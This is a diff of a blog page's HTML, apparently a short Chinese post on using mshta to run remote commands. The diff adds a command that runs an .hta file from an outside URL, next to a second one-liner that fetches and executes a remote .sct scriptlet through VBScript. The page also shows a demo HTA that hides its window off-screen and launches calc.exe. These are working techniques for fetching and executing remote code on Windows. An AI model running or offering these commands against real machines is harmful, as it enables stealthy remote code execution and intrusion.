@@ -14,7 +14,7 @@
 <meta property="og:url" content="https://niwbie.github.io/2017/04/12/mshta/index.html">
 <meta property="og:site_name" content="isee'blog">
 <meta property="og:description" content="利用mshta执行远程命令mshta">
-<meta property="og:updated_time" content="2017-11-22T02:20:32.110Z">
+<meta property="og:updated_time" content="2017-11-22T02:23:07.310Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mshta">
 <meta name="twitter:description" content="利用mshta执行远程命令mshta">
@@ -153,7 +153,7 @@
       
         <p>利用mshta执行远程命令<br><a href="/image/mshta/calc.hta">mshta</a></p>
 <a id="more"></a>
-<p>1) mshta http://<br>2) mshta mshta vbscript:Close(Execute(“GetObject(“”script:<a href="http://webserver/payload.sct" target="_blank" rel="external">http://webserver/payload.sct</a>“”)”))</p>
+<p>1) mshta <a href="http://papap.info/image/mshta/calc.hta" target="_blank" rel="external">http://papap.info/image/mshta/calc.hta</a><br>2) mshta mshta vbscript:Close(Execute(“GetObject(“”script:<a href="http://webserver/payload.sct" target="_blank" rel="external">http://webserver/payload.sct</a>“”)”))</p>
 <p>calc.hta:<br>    <html><br>    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"><br>    <head><br>    <script language="VBScript"><br>    Window.ReSizeTo 0, 0<br>    Window.moveTo -2000,-2000<br>    Set objShell = CreateObject(“Wscript.Shell”)<br>    objShell.Run “calc.exe”<br>    self.close<br>    </script><br>    </head><body><br>    demo<br>    </body><br>    <br>    </html> </p>
 
       
